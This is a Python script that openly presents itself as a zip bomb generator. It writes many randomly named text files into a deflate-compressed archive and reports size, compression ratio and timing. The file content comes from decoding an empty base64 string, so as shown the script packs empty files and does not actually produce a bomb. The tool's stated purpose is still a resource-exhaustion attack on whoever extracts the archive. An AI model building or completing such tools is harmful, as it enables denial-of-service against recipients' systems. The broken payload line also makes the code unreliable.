import os
import random
import zipfile
import base64
import sys
import time

def format_unit_size(unformatted_size):
    units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB']
    i = 0
    while unformatted_size >= 1024 and i < len(units) - 1:
        unformatted_size /= 1024
        i += 1

    size = f"{round(unformatted_size, 2)} {units[i]}"
    return size

def format_time(unformatted_time):
    units = ['s', 'm', 'h']
    i = 0
    while unformatted_time >= 60 and i < len(units) - 1:
        unformatted_time /= 60
        i += 1

    time = f"{round(unformatted_time, 2)} {units[i]}"
    return time

zip_location = input("Zip Bomb output location: ").replace("\\", "/").strip("\"")
try:
    range_thing = int(input("Files to make: "))
except ValueError:
    print("Files to make is not an integer")
    sys.exit()

if not zip_location.endswith(".zip"):
    print("Zip Bomb output location does not end with .zip")
    sys.exit()

directory = os.path.dirname(zip_location)

if not os.path.exists(directory):
    os.makedirs(directory)

if os.path.exists(zip_location):
    os.remove(zip_location)

temp_files = []

zip_size = 0

start_time = time.time()

for i in range(range_thing):
    filename = str(random.randint(10000000, 99999999)) + ".txt"
    filepath = os.path.join(directory, filename)
    temp_files.append(filepath)
    
    elapsed_time = time.time() - start_time
    remaining_files = range_thing - (i + 1)
    average_time_per_file = elapsed_time / (i + 1)
    remaining_time = average_time_per_file * remaining_files
    percent_complete = round(((i + 1) / range_thing) * 100, 2)

    with open(filepath, "w", encoding='utf-8') as f:
        f.write(base64.b64decode("").decode('utf-8'))
    zip_size += os.path.getsize(filepath)
    with zipfile.ZipFile(zip_location, 'a', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.write(filepath, os.path.basename(filepath))
    os.remove(filepath)

    print(f"{percent_complete}% complete - {i + 1}/{range_thing} files created - {format_unit_size(zip_size)} of data made - {format_time(elapsed_time)} elapsed - {format_time(remaining_time)} remaining", end="\r")

total_time = time.time() - start_time

print("Process completed.")
print(f"Unzipped storage size: {format_unit_size(zip_size)}")
print(f"Zip storage size: {format_unit_size(os.path.getsize(zip_location))}")
print(f"Compression ratio: {zip_size / os.path.getsize(zip_location):.2f}")
print(f"Processing speed: {zip_size / total_time / 1024 / 1024:.2f} MB/s")
print(f"Processing time: {total_time:.2f} seconds")